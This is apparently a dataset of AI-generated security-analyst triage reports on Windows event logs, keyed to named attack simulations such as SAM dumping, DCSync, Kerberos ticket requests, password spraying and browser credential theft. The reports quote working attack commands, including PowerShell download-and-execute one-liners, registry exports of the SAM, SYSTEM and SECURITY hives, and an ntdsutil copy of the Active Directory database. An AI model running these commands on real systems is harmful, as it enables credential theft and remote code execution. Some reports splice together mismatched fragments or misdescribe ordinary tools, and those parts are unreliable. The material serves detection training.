   - There are several instances of svchost.exe (a legitimate Windows service host process) adjusting system time, as indicated by Event ID 4616 and Event ID 24. While unusual time changes can sometimes indicate malicious activity, in this context, they appear synchronized with the Windows Time service operations (Event ID 35, time.windows.com) and may not suggest anything immediately malicious.

2. **Application Log:**
   - Windows Defender is actively running, as indicated by SECURITY_PRODUCT_STATE_ON events, which suggests the system has antivirus protection enabled.
   - An event for EdgeUpdate indicates the service has stopped, which is common after updates.

3. **Windows PowerShell Log:**
   - A significant concern arises from the logs showing PowerShell executing a script downloaded from an external source. The command `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script ...')}` is executed, indicating that a potentially malicious script was run. This type of PowerShell activity is often associated with malware delivery or execution techniques, particularly when scripts are run directly from the internet.

4. **Sysmon Log:**
   - The logs show different processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` being executed. 
   - Interest lies in the PowerShell process executing with a command line that includes direct execution from a web-based script (`iex(new-object net.webclient).downloadstring(...)`). Coupled with the PowerShell logs, this reinforces potential malicious activity, as such behavior is consistent with PowerShell-based attacks.

5. **Security Log:**
   - Time changes reflected in security logs parallel entries in system logs showing svchost.exe as the executing process. This synchronization supports the context of normal time service operations.

**Assessment and Recommendations:**
- The execution of a PowerShell script directly from an external URL is highly suspicious and indicative of potentially malicious behavior. This could be an attempt to download and execute malware remotely, often seen in initial compromise vectors like phishing or exploit kits.
  
- **Resolution: MALICIOUS.** The PowerShell activities are consistent with malicious behavior attempting to leverage scripting for unauthorized actions. The execution of scripts from unknown external paths should be addressed immediately.

**Guidance on How to Proceed:**
- Isolate the affected host to prevent any potential spread of malware.
- Conduct a full malware scan with updated antivirus/antimalware tools.
- Review PowerShell execution policies to prevent scripts from executing from web sources.
- Examine network logs for any unexpected outbound connections related to the PowerShell command.
- Assess Windows Defender logs for any detections or alerts that coincide with the timeline provided.
- Educate end-users about the risks of executing scripts or software from unknown sources.
- After remediation, monitor the system closely for any unusual or recurring activities."
WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,"After analyzing the provided logs, the primary focus areas are the PowerShell command execution and multiple failed credential access attempts. Below, I have detailed the suspicious activities and provided an assessment.

### Analysis of Suspicious and Anomalous Behavior

1. **Suspicious PowerShell Activity:**
   - **Event Extract:** The Windows PowerShell log contains activity indicative of potentially malicious behavior. Specifically, the command `powershell.exe & {$script_repo='https://raw.githubusercontent.com/script';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1');samfile -consoleoutput -noninteractive}` is executed. This indicates an attempt to download and execute a script from an external source using PowerShell. This is a common method used by attackers to establish a foothold in a system by downloading and running remote code (often seen in malware delivery or actions post-compromise).

2. **Failed Credential Access:**
   - The Security event logs show several entries (Event ID 5379) indicating failed attempts at accessing credentials via services like Microsoft Account and Windows Live with return code `3221226021`, which means there was an unsuccessful operation. This could indicate an attempt at unauthorized access, although unsuccessful.

3. **Benign Activity:**
   - The Application, Sysmon, and System logs predominantly show regular system operations such as Windows Defender updates, System processes like `wuauclt.exe`, and handling updates with no clear anomalies except routine actions such as service starts, process creations for known and legitimate system processes.
   - Updates are processed in a manner typical for Windows systems maintaining security (i.e., through `wuauclt.exe` and `AM_Delta.exe` for Microsoft Defender).

### Assessment and Recommendation

**Assessment: MALICIOUS**

The combination of the PowerShell script execution, which fetches scripts from an untrusted external repository over the internet, and repeated credential access attempts indicates malicious behavior beyond normal operations. The execution of remote scripts could lead to further exploitation activities such as data exfiltration, lateral movement, or the deployment of malware.

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the affected machine (Server002) from the network to prevent further potential unauthorized activities.
   - Conduct endpoint scans on Server002 and related systems for any malware traces using Windows Defender or an equivalent up-to-date antivirus/antimalware solution.

2. **Containment and Eradication:**
   - Block the domain or IP referenced in the PowerShell command from network traffic to prevent future downloads from this potentially malicious URL.
   - Analyze the script from the external source if possible, and identify any changes or files created by it within the system.
   - Review and reset credentials, especially if any accounts were potentially exposed or accessed.

3. **Post-Incident Actions:**
   - Conduct a broader threat hunt to identify any further indicators of compromise (IOCs) across the organization’s network.
   - Educate users, particularly those with elevated access like the CEO, on the dangers of executing unknown scripts and best practices for cybersecurity hygiene.

Document this incident for future reference and update security controls or policies to avoid similar incidents in the future."
Simulating access to Windows Edge Login Data,"### Detailed Analysis:

Upon reviewing the provided logs, certain activities require further examination:

1. **PowerShell Events:**
   - There are multiple instances of PowerShell being executed with a command line that includes the `Copy-Item` command. The command copies the `Edge` browser's user data to a temporary directory:  
     ```powershell
     powershell.exe & {Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Edge"" -Force -Recurse}
     ```
   - **Suspicious Behavior:** This activity is noteworthy for several reasons:
     - **Data Exfiltration:** Copying browser data can be indicative of an attempt to exfiltrate user data, such as browsing history, saved passwords, cookies, etc.
     - **Use of Temp Directories:** Writing to a temp directory often suggests an attempt to disguise or temporarily hold data before further actions.
     - **Obfuscation or Evasion:** Using 'ADMIN_~1' as part of the path and '..' traversal may be attempts to evade detection or mask true intent.

2. **Sysmon Logs:**
   - The Sysmon logs correspond with the PowerShell activity, confirming the execution of PowerShell by the user `SERVER002\admin_test` with high integrity level indicating administrative privileges.
   - Additional processes include `wevtutil.exe` and `whoami.exe`, which are legitimate system tools but can be used for reconnaissance and gathering system information, supporting lateral movement or privilege escalation attempts.

3. **Consistency Across Logs:**
   - The sequence of events and the involved processes suggest a coordinated set of actions by or as `admin_test` on `SERVER002` machine.
   - There is no direct evidence of privilege escalation from a lower privilege user since the actions are executed with an account (`admin_test`) having high integrity level.

### Assessment:

- The observed copying of browser data by PowerShell indicates possible data exfiltration, an activity commonly associated with malicious intent.
- The combination of PowerShell usage, sensitive data manipulation, and other system utilities used by an admin account could imply the presence of advanced persistent threat (APT) tactics or an external attacker leveraging administrative access.
- Given these observations and the potential risk of data leakage or further exploit, the behavior can't be deemed benign.

### Resolution: **MALICIOUS**

- **Threats/Risks Identified:**
  - Potential unauthorized data access and exfiltration targeting sensitive user information within the `Edge` browser.
  
- **Guidance on How to Proceed:**
  - **Immediate Response:**
    - **Containment:** Isolate `Server002` from the network to prevent additional data exfiltration.
    - **Credential Revocation:** Disable or reset credentials for the `admin_test` account and any other potentially compromised accounts.
  - **Further Investigation:**
    - **Forensics:** Conduct a deeper forensic analysis of the affected system to understand the full scope of the compromise.
    - **Log Review:** Analyze additional logs for lateral movement indicators or other compromised accounts/systems.
  - **Remediation:**
    - **Patch and Update:** Ensure all systems are updated and patched to mitigate any exploited vulnerabilities.
    - **Review and Harden Security Policies:** Implement stricter PowerShell usage policies and enhance EDR detection rules for script execution and sensitive data access.
"
PowerDump Hashes and Usernames from Registry,"### Detailed Analysis of the Logs

#### Suspicious/Anomalous Behavior:

1. **PowerShell Activity**:
   - The logs show a PowerShell execution with command line arguments attempting to ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" and importing a module from a path that includes `Externalfiles\PowerDump.ps1`. This is highly suspicious because it directly indicates an attempt to disable security defenses (Windows Defender) and run a potentially harmful script (`PowerDump.ps1`). Disabling or bypassing antivirus services is a common tactic used by attackers to avoid detection.

2. **Process Execution**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by user `SERVER002\admin_test` are observed. While these could be routine, the significant number of executions in rapid succession might suggest malicious activity, such as a script or software attempting to access or modify event logs.

3. **Context of Events**:
   - The PowerShell operation occurs soon before the Windows Defender status checks are logged, suggesting that an attempt was made to disable it.
   - No additional Security logs (apart from the Sysmon logs) provide corroborative actions (like user logins or privilege escalations), suggesting either a very stealthy or a partially successful compromise without triggering additional security alerts.

4. **Execution of AM_Delta.exe**:
   - Executions related to Microsoft Defender and updates (`AM_Delta.exe` and `MpSigStub.exe`) are shown but occur after the PowerShell command. These could suggest an automatic or manual response to re-enable defenses.

5. **Windows Defender Status**:
   - Windows Defender appears to be `SECURITY_PRODUCT_STATE_ON`, which suggests it was enabled post-incident or perhaps wasn't successfully disabled by the attacker.

#### Assessment of Malicious Activity:

**Indicators of Malicious Activity:**
- The PowerShell command attempting to disable Windows Defender real-time protection is a definitive indicator of malicious intent.
- The use of a potentially harmful script (`PowerDump.ps1`) aligns with known offensive tactics.

#### Resolution:
- **MALICIOUS**: Based on the evidence of attempted disabling of Windows Defender and running potentially harmful scripts without clear benign context, this activity is considered 100% malicious. It’s crucial to note the command context and the potential payload used (`PowerDump.ps1`).

### Recommendations:

1. **Immediate Actions**:
   - Contain the affected system (Server002) to prevent potential lateral movement.
   - Conduct a thorough examination of the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory and associated scripts (`PowerDump.ps1`) for further analysis and evidence collection.
   - Check other endpoints for similar IOCs (Indicators of Compromise) to ascertain the scope of this potential compromise.

2. **Further Investigation**:
   - Review historical logs for the `SERVER002\admin_test` account for anomalous behavior or unauthorized access.
   - Investigate other potential backdoor activities or persistence mechanisms deployed as part of this attack.

3. **System Hardening**:
   - Ensure PowerShell logging is enabled and detailed for better tracking of suspicious command executions.
   - Review and strengthen endpoint detection measures to promptly detect and block attempts to disable or bypass security software.

4. **Communication**:
   - Inform relevant stakeholders, including the IT Security team and company management, about the findings for coordinated response and remediation efforts.

It is critical to respond swiftly to this activity due to its nature and potential impact on corporate security posture."
Dump Active Directory Database with NTDSUtil,"**Analysis of Windows Event Logs**

Upon examining the provided Sysmon, Security, System, and Windows Update logs, there are several noteworthy observations.

### Suspicious or Anomalous Behavior:

1. **Registry Queries:**
   - The usage of `reg query` in `C:\Windows\System32\cmd.exe` with a focus on `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions` could indicate attempts to gather system information related to Windows installation and server roles.
   - `findstr.exe` was used to search for `LanmanNT`, which is indicative of checking for domain controller roles. This could be part of reconnaissance activities aimed at identifying domain controllers in the environment.

2. **Use of NTDSUtil:**
   - The command `ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_data"" q q` executed within `cmd.exe` is suspicious as it involves in-memory operations related to Active Directory. `NTDSUtil` is commonly used for Active Directory database operations, including snapshots, which could be indicative of attempts to exfiltrate AD data.

3. **Frequent Execution of `wevtutil.exe`:**
   - `wevtutil.exe`, involved in managing event logs, appears multiple times. Frequent invocation with elevated privileges could suggest attempts to clear event logs or tamper with them. However, the motive isn't explicitly clear without additional context or results from the execution.

4. **Execution of `whoami.exe`:**
   - The presence of `whoami.exe` execution following the aforementioned activities can suggest user enumeration, potentially indicating lateral movement or privilege escalation attempts.

5. **Edge Update Activity:**
   - There is a Microsoft Edge update activity. While this is generally benign, it could mask other activities if logs from other channels don't correlate well. However, the command-line arguments show expected parameters for legitimate updates.

### Security and System Logs:

- The security logs (Windows Event ID 5379) show failed credential manager access attempts, which might suggest attempts to access stored credentials but could also align with normal system behavior under certain misconfigurations or policy settings.
- System logs primarily indicate regular Windows Update activities.

### Assessment:

Based on the analysis above:

- The use of tools and commands such as `reg.exe`, `ntdsutil`, and `wevtutil.exe` could indeed be suspicious depending on context, like the presence of indicators or absence of a valid operational requirement for such commands.
- Even though their presence alone does not confirm malicious activities, the combination of these commands executed in a short timeframe potentially signals non-standard behavior potentially indicative of reconnaissance or preparation for an attack.

### Resolution:

Considering the potential for Active Directory data manipulation or extraction and the enumeration attempts, I classify this activity as **SUSPICIOUS**. It warrants further investigation, including:

1. **Detailed User Activity Review:** Look at `SERVER002\admin_test` user's past activities and any other related suspicious behaviors.
2. **Network Traffic Analysis:** Check outbound traffic for potential data exfiltration attempts to a remote host.
3. **Check for Persistence or Backdoors:** Evaluate for any additional indicators of compromised accounts or persistence mechanisms established by malicious actors.
4. **Validation with Threat Intelligence:** Cross-reference file hashes and command executions with known threat intelligence to assess any known IOCs present in these logs.

In conclusion, the combination of system information gathering and potential interaction with Active Directory data is suspicious enough to warrant further examination to ensure no potential breach is occurring."
Decrypt Mozilla Passwords with Firepwd.py,"Based on the analysis of the given logs, several observations and conclusions can be drawn regarding potential malicious activity:

### Analysis:

1. **PowerShell Activities:**
   - The logs indicate that PowerShell was executing a script that involved accessing the Firefox profile directory. The script appears to be looking for a database file within Firefox's profile directory and using a Python script located in a temporary directory to interact with it. This is suspicious as it might suggest an attempt to access stored passwords or other sensitive information within the browser.

2. **Use of Temporary Directories:**
   - The activity includes executing a Python script from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..`) which is typical for malicious scripts as they often execute from temp directories to avoid detection.

3. **Command Execution:**
   - Execution of the command `cmd /c` with the concatenation of Python scripts and reading from a temporary text file further supports the hypothesis of this operation attempting to extract information.

4. **Installation Events:**
   - Numerous Python-related installation events are recorded close to the suspicious PowerShell activity. These installations seem legitimate, but their timing with the PowerShell activity could suggest that Python was installed specifically to run these malicious scripts.

5. **Sysmon Logs:**
   - These logs confirm PowerShell and `cmd.exe` executions the User ""SERVER002\\admin_test"". The process chain from PowerShell to cmd to a Python script suggests predefined, automated activity rather than legitimate user action. Additionally, `wevtutil.exe` usage could imply manipulation or clearing of event logs to hide malicious activity.

6. **Security Log:**
   - The security log indicates a logoff event (Event ID 4634) for the user ""admin_test"" soon after these activities, which might imply an attempt to conclude malicious activities.

### Conclusion:

The overall combination of analyzing the use of PowerShell, the execution of scripts from temporary directories, accessing potentially sensitive browser-stored data, and the timing with installations points towards potentially malicious activities on the system. The orchestrated command executions and environment setups suggest a premeditated attempt to extract data.

### Recommendation:

- **Resolution: MALICIOUS**
  Given these findings, this activity should be considered malicious. Immediate action should include:
  - Isolating the affected system from the network to prevent further data exfiltration or network spread.
  - Conducting a thorough forensic analysis to determine what data may have been compromised.
  - Reviewing the user's account activity and access privileges to ensure they are consistent with their role.
  - Implementing tighter security measures, such as enhanced monitoring and behavioral analyses, to prevent similar future incidents."
"Dumping of SAM, creds, and secrets(Reg Export)","Upon analyzing the provided Windows event logs, here is a detailed analysis with a focus on suspicious or malicious activity indicators:

### Detailed Analysis:

1. **Unusual Registry Export Activity:**
   - The execution of `cmd.exe` with a command line to export registry hives (`HKLM\sam`, `HKLM\system`, and `HKLM\security`) is a highly suspicious activity. This behavior is often associated with malicious attempts to gather sensitive information from a system. The command executed is:
     ```
     cmd.exe /c reg export HKLM\sam %%temp%%\sam & reg export HKLM\system %%temp%%\system & reg export HKLM\security %%temp%%\security
     ```
   - The registry paths involved contain sensitive security and system configuration data, commonly targeted for data exfiltration or password cracking.

2. **Execution Context:**
   - The command was executed by the user `SERVER002\admin_test` with high integrity level, indicating elevated privileges. The parent process is `wsmprovhost.exe`, which is a legitimate Windows process but its usage as a parent for `cmd.exe` performing such export is unconventional and suspicious.

3. **Multiple Invocations of System Utilities:**
   - Processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are seen executing. While these utilities themselves are not malicious, their usage can be part of reconnaissance activities, especially when used in conjunction with suspicious actors.

4. **Time Discrepancy and Invalid Credentials:**
   - There are security events indicating unsuccessful credential operations with errors (`ReturnCode: 3221226021`), which may suggest either incorrect login attempts or potentially malicious credential dumping activities.
   - Additionally, there were changes in system time which can be indicative of an attempt to manipulate timestamps in logs to obfuscate activities.

5. **Routine System Updates:**
   - Windows Update related activities including updates for Microsoft Defender Antivirus were observed. These logs appear normal and expected.

### Assessment of the Situation:

The logs show significant indicators of potentially malicious activity, mainly through unauthorized registry access and export attempts that align with credential theft patterns. The sequence of actions, including invoking system commands under elevated privileges, suggests that an attacker may be trying to obtain sensitive information or leave a backdoor.

### Identified Threats and Risks:

- **Registry Export:** Likely attempt to harvest system and security credentials.
- **Potential Reconnaissance:** Execution of utilities like `whoami`, `hostname`, and `wevtutil` potentially linked to initial enumeration and persistence efforts.

### Guidance for Proceeding:

Given the nature of the events and the risk associated with potential credential dumping and data exfiltration, immediate action is recommended:

1. **Isolate the Affected System:** Prevent any network communication to limit potential data leaks or spread of any compromise.
2. **Full Malware Scan:** Conduct an immediate and thorough malware scan of the system using up-to-date antivirus and antimalware tools.

- The primary concern within these logs is the use of PowerShell to execute an external script downloaded from a remote repository. This behavior is typical of malicious activities like script-based attacks, potentially indicating a compromise or attempted data breach via remote execution.

### Threats and Risks Identified:
- **Malicious Script Execution**: The retrieval and execution of scripts from untrusted or unusual sources represent a significant threat vector, potentially leading to unauthorized access, data leakage, or further exploitation.

- **Credential Access or Information Gathering**: The `whoami.exe` usage in sequence with downloaded scripts could imply command or information gathering intentions.

### Guidance on How to Proceed:
1. **Contain**: Immediately isolate the affected machine (CEO's computer, in this case) from the network to prevent possible lateral movement or data exfiltration.
2. **Investigate**: Conduct a thorough analysis of the script that was downloaded and executed to understand its functionality and impact.
3. **Remediate**: Depending on the findings, clean the system of any malicious files/scripts, change relevant credentials, and ensure all patches and protections are up-to-date.
4. **Monitor and Report**: Increase monitoring on this endpoint for related suspicious activities and document/report findings according to company policy.

### Resolution:
**MALICIOUS** - The logs contain activity that strongly suggests malicious behavior due to unauthorized external script execution through PowerShell."
DCSync (Active Directory),"**Analysis of the Provided Windows Event Logs:**

### Observations:

1. **Unusual Command Execution:**
   - Sysmon EventID 1 indicates a Process Creation event where `cmd.exe` was executed with the command line `""C:\\Windows\\system32\\cmd.exe"" /c echo %%tmp%%\\script\\x64\\script.exe`. The execution of a command shell to perform an echo that outputs to a file path that does not exist in a straightforward form (like a local directory) hints at an attempt to masquerade or mislead with the usage of environment variables. This could potentially be used to obfuscate a malicious script location.

2. **Suspicion of Privileged Execution:**
   - The process is executed by `admin_test` with a high integrity level, indicating it was running with elevated privileges. The use of potentially privileged accounts and high integrity levels could indicate a risk of unauthorized administrative actions.

3. **Frequent Wevtutil Executions:**
   - Multiple executions of `wevtutil.exe`, a command-line utility used for managing Windows event logs, can be noted. Frequent and rapid usage of this via the same account `admin_test` might indicate an attempt to clear, export, or manage event logs in a suspicious manner.

4. **Regular System Activity:**
   - Multiple executed processes (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) associated with system updates, Microsoft Defender, and Windows Update suggest normal patching and update processes, which are routine for a Windows environment.

5. **Security Product Status:**
   - Windows Defender is operational as indicated by multiple Application logs, meaning a layer of security is believed to be in function protecting the system.

6. **Failed Credential Access Events:**
   - Security logs show EventID 5379 where there is a repeated return code of `3221226021`, indicating failed attempts to retrieve credentials. This is notable as multiple attempts correlating with the same subject and process hint at potentially unauthorized or failed authentication processes.

7. **High Integrity System Processes:**
   - `wuauclt.exe`, `MpSigStub.exe`, and other system-level processes running under NT AUTHORITY\SYSTEM seem benign as they are expected in a Windows update context.

### Assessment:

The logs primarily show a mixed pattern of normal system administration activities and some anomalies. The use of cmd.exe to execute a potentially obfuscated script path and the rapid sequence of event utility executions warrant a closer look, especially given the context of the EDR alert on the CEO's machine. 

Furthermore, the repetitive access to credentials without success could indicate either a misconfigured service or a brute force attempt, yet given the environment, it might be benign if aligned with legitimate software activities.

### Recommendation:

- Conduct an in-depth review of the specific script output and any associated files referenced by the apparently obfuscated execution to ascertain its legitimacy.
  
- Investigate the purpose and necessity behind the frequent usage of `wevtutil.exe` by the `admin_test` account. Checking against any corresponding user activity logs or genuine use-case scenarios could clarify intent.

- Verify that the processes attempting credential access are indeed authorized. Correlate these events with legitimate service accounts and tasks expected on the system.

### Resolution: **SUSPICIOUS**

Given the potential risks associated with obfuscated script execution and abnormal practice of event log management, further investigation is necessary to clarify if malicious actions were anticipated or executed, and to verify the authenticity of processes flagged with credential access failure."
WebBrowserPassView - Credentials from Browser,"**Analysis of Log Entries**

Upon investigating the provided event logs, the following observations were made:

1. **Suspicious Process Execution:**
   - There are multiple Sysmon events indicating the execution of a script (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\script.exe`) using PowerShell. The process is associated with ""Web Browser Password Viewer"" by NirSoft, which is known for creating utility tools that might be used for credential extraction, raising red flags for potential malicious intent.
   
2. **Unusual PowerShell Commands:**
   - The `PowerShell` log indicates a command execution using `Start-Process` with an obscure path pointing to the script. The use of PowerShell with those parameters might indicate an attempt to execute potentially harmful scripts.

3. **Elevated Privileges:**
   - Several logs indicate privileged actions executed under SYSTEM and NT AUTHORITY contexts. Notably, there are logs (EventID 4672) indicating the assignment of high-level privileges such as `SeDebugPrivilege`, which could be exploited for unauthorized access or privilege escalation.
   
4. **Failed Credential Access Attempt:**
   - Repeated EventID 5379 entries suggest failed attempts to access credentials related to the `MicrosoftAccount:user=02txoixylodcstop`. This suggests trying to access credentials which could be a sign of attempted unauthorized access.

5. **Multiple Logon Events:**
   - Several EventID 4624 entries show logon events with high privileges, which seem to happen around the timeline of script execution, indicating potential misuse of credentials for unauthorized logins.

**Assessment and Conclusion**

Considering the indicators:

- The use of a well-known tool for password extraction (""Web Browser Password Viewer"" by NirSoft) emitted from a temporary directory through PowerShell execution indicates a potential compromise. This tool, while legitimate, is known for its capability to retrieve stored passwords from browsers, making it suspicious when executed in this context.

- The persistence and repeated execution of processes with rapid succession and elevated privileges strongly suggests an attempt to extract sensitive information or escalate privileges illicitly.

Given these observations, the activity can be categorized as **MALICIOUS**. The execution pattern, context, and tools used strongly align with known tactics for compromise and unauthorized access.

**Guidance on How to Proceed**

1. **Immediate Isolation:** Isolate the host from the network to prevent further unauthorized access or data exfiltration.
   
2. **Access Review:** Conduct a thorough review of user accounts and privileges to ensure that no unauthorized changes were made during the incident.
   
3. **Forensic Analysis:** Perform a deeper forensic investigation to gather more evidence about the scope of the breach, identifying any exfiltration of data or additional compromised systems.
   
4. **Incident Response:** Initiate an incident response plan to remediate the identified potential compromise, including patching vulnerabilities and updating security configurations.
   
5. **Security Enhancements:** Consider implementing stricter application control and monitoring to prevent the execution of unmanaged scripts and potential credential-stealing applications.

Engaging with an incident response team is recommended for a detailed assessment and clean-up of the affected systems."
Password Spray Microsoft Online Accounts with MSOLSpray (Azure-O365),"Upon analyzing the provided logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:
1. **PowerShell Invocation**: There are multiple logs indicating the use of PowerShell to run a script called `MSOLSpray.ps1`. This is referenced in both the Sysmon and the Windows PowerShell logs. The `Invoke-MSOLSpray` command is used, which can be utilized for password spraying attacks against Azure AD, Office 365, etc.

2. **Process Execution**: Within the Sysmon logs, several processes were created around the same time (`wevtutil.exe`, `conhost.exe`, `PowerShell.exe`) under the user `SERVER002\admin_test`. The use of `wevtutil.exe` could potentially be used to clear event logs, which is an action often associated with malicious activity to cover tracks.

3. **Files and Directories**: The PowerShell command is run from a temporary directory which is pointing towards potentially arbitrary file execution: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\MSOLSpray.ps1`. Execution from a temp directory or command-line arguments involving sensitive actions can be a sign of suspicious behavior.

4. **Integrity Level**: The process integrity levels for many processes are listed as 'High', which can suggest that actions were executed with elevated privileges, implying potential privilege escalation.

### Indicators of Malicious Activity:
- **MSOLSpray.ps1 script**: The execution of the `MSOLSpray.ps1` script, through PowerShell, is particularly indicative of a potential password spraying attack, a credential-stuffing attack targeting Microsoft cloud services.

### Logs Indicating Confirmed Malicious Activity:
The invocation of the `MSOLSpray` script via PowerShell properties speaking to command execution specifically tailored toward unauthorized access attempts suggest malicious intent.

### Resolution:
- **MALICIOUS**: The use of a PowerShell script for password spraying (e.g., `Invoke-MSOLSpray`) against user accounts is a recognized method of compromise. This, coupled with the potential log manipulation (invocation of `wevtutil.exe`), and the elevated integrity levels further corroborates the malicious classification.

### Recommendations:
1. **Incident Response**: Immediately trigger the incident response process. Secure the affected machine to prevent further unauthorized activities.

2. **Credentials**: Promptly change the passwords of all user accounts, especially those managed on the affected machine, and investigate for any successful unauthorized access.

3. **Monitor and Blocklists**: Enhance monitoring to identify similar behaviors in the future and consider adding the invoked scripts and IPs (if any recorded) to blocklists.

4. **System Audit**: Conduct a full audit on the affected system for potential persistence mechanisms that may have been installed.

5. **Patching and Updates**: Ensure all systems are up to date with security patches to protect against known vulnerabilities.

The logs analyzed contain sufficient evidence to strongly suggest malicious activities aimed at credential access through password spraying techniques."
WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"Upon analysis of the provided logs, several activities stand out as suspicious or indicative of potentially malicious activity. Key points observed in different logs are as follows:

**1. PowerShell Activity:**

- The PowerShell logs indicate suspicious behavior with the execution of an encoded PowerShell command:
  ```
  powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-Internalmonologue.ps1')}
  Invoke-Internalmonologue -command \""-Downgrade true -impersonate true -restore true\""
  ```
  This command downloads and executes a PowerShell script from a remote location. This method is often seen in malware attacks where scripts are executed via PowerShell to perform actions such as credential dumping or creating persistence on the host.

**2. Security Log Event 4672:**

- This event indicates that a privileged logon session was created by the user `admin_test` with several high-level privileges like `SeDebugPrivilege`, `SeSecurityPrivilege`, `SeBackupPrivilege`, and others. While this can be legitimate, the context of suspicious PowerShell activity makes this event more concerning.

**3. Security Log Event 4624 & 4634:**

- An account `admin_test` logged on with logon type 3 (network logon), succeeded and was followed by a privileged account logon (event 4672). This suggests the possibility of lateral movement or a potential unauthorized access attempt.

**4. Sysmon Logs:**

- There is a series of process creations involving Windows utilities like `whoami.exe`, `hostname.exe`, and repeated usage of `conhost.exe`. While these can be used for legitimate purposes, they can also be used to gather reconnaissance information.

**Assessment:**
The activities described raise significant concern, particularly the unauthorized execution of a PowerShell script from an untrusted source. In addition, the presence of event 4672 with numerous administrative privileges further suggests potential misuse of elevated privileges.

Given the nature of the PowerShell script, its source, and the privileges of the logon sessions observed, these activities can be considered highly indicative of malicious intent.

**Resolution: MALICIOUS**

**Guidance:**
1. **Containment:** Immediately isolate the affected machine (CEO's machine) from the network to prevent any further malicious activities.
2. **Investigation:** Perform a thorough forensic analysis of the affected machine. Check for any additional persistence mechanisms, malware traces, or other indicators of compromise (IOCs).
3. **Credential Security:** Reset credentials for affected users, especially any user with elevated privileges like `admin_test`.
4. **Monitoring & Logging:** Increase monitoring on network traffic and logins for unusual activity. Enhance logging configurations to detect similar activities in the future.
5. **Preventative Measures:** Educate users on the dangers of executing untrusted scripts and consider implementing application control policies to restrict unauthorized scripts and commands execution."
WinPwn - sensitivefiles,"### Analysis of the Logs

1. **Suspicious PowerShell Activity**:
   - The logs indicate the execution of a PowerShell script via the command line, which downloads and executes a script from a GitHub repository: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')`.
   - The command includes `sensitivefiles`, which could imply the script is designed to access or manipulate sensitive data.
   - The script execution is logged under a user profile SERVER002\admin_test, with high integrity, indicating elevated privileges.

2. **Process Execution**:
   - Multiple instances of legitimate system binaries such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were launched by the user SERVER002\admin_test. While `wevtutil.exe` might be used for legitimate event log querying, its frequent use here alongside `conhost.exe` and `whoami.exe` could indicate system reconnaissance or data collection.
   - The repeated execution of `wevtutil.exe` by the same user account in quick succession is suspicious as attackers might try to hide activities by clearing logs or extracting log data.

3. **Microsoft Edge Update Process**:
   - There is significant activity related to `MicrosoftEdgeUpdate.exe`, which is an expected software update process. However, processes like these can be leveraged for persistence or other malicious activities if compromised.
   - There is a normal sequence of update-related processes and no direct evidence indicating compromise from these logs alone.

4. **Time Change Events**:
   - The security and system logs record changes in the system time by the process `svchost.exe`. While minor time adjustments might be routine, they can also be a tactic used by attackers to manipulate time stamps of events to cover tracks.

### Assessment

- **Indicators of Compromise**: The PowerShell command execution to download and run a script from a GitHub repository is a major red flag. This activity indicates the potential for unauthorized code execution on the server, which is a known tactic used in various attacks to run malware or other unauthorized tasks.
- **Reconnaissance and Anomaly Detection**: The repeated use of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the user `admin_test` suggests possible reconnaissance or administrative activity. These might need a closer review to understand the context.
- **Edge Update Activities**: While they seem benign and related to normal update processes, vigilance is warranted to ensure that no injection or side-loading attacks occurred using these routines.

### Threats or Risks Identified

- **Potential Remote Code Execution via PowerShell**: There is a high risk that the executed PowerShell script could be used for malicious purposes, such as data exfiltration, further system compromise, or persistence.

4. **Enhance Monitoring**:
   - Implement more stringent monitoring for PowerShell activities and set alerts for abnormal script executions.

### Resolution: MALICIOUS

The act of downloading and executing a remote script using PowerShell strongly indicates unauthorized and potentially harmful behavior, classifying these activities as **malicious** until proven otherwise through further detailed investigation."
Request All Tickets via PowerShell,"### Analysis

The provided logs include entries from various system logs, including Application, Sysmon, and Windows PowerShell logs for the computer `Server002`. Here are the key observations:

1. **Sysmon Log Observations**:
    - The logs show multiple executions of PowerShell with potentially suspicious command-line arguments. The sequence of process executions suggests attempts to interact with `Service Principal Names (SPNs)` using `setspn.exe`. This action is associated with attempts to gather Active Directory related information, potentially indicating lateral movement or reconnaissance activities:
      ```plaintext
      PowerShell: ""powershell.exe"" & {Add-Type -AssemblyName System.IdentityModel, setspn.exe -T %%USERDNSDOMAIN%% -Q */* | Select-String '^CN' -Context 0,1 | %% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }}
      ```
    - The presence of execution for `wevtutil.exe` in the system logs might suggest potential tampering with Event Logs - a tactic sometimes used to clear logs or obfuscate malicious activity.
    - Another unusual aspect is the repeated and rapid sequential execution of Sysinternals utilities like `hostname.exe` and `whoami.exe`, which might be harmless user activities but could also indicate script-driven reconnaissance.

2. **Microsoft Edge Update Processes**:
    - Numerous activities related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) were noted, which could be a typical background update process. However, they are executed with high frequency, which deviates from a normal update mechanism rhythm, suggesting either misconfigured updates or a potential obfuscation tactic.

